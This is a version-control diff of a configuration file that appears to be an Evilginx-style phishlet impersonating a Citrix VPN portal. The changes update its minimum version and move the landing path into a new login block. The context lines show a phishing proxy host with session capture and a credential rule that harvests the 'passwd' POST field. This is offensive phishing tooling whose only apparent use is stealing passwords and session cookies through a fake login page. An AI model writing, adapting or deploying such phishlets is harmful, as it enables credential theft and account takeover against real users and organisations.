@@ -1,6 +1,6 @@
 name: 'Citrix Portal'
 author: '@424f424f'
-min_ver: '2.2.0'
+min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'subdomainhere', orig_sub: 'subdomainhere', domain: 'domainhere', session: true, is_landing: true}
 sub_filters:
@@ -17,5 +17,6 @@ credentials:
     key: 'passwd'
     search: '(.*)'
     type: 'post'
-landing_path:
-  - '/vpn/index.html'
+login:
+  domain: 'subdomainhere.domainhere'
+  path: '/vpn/index.html'
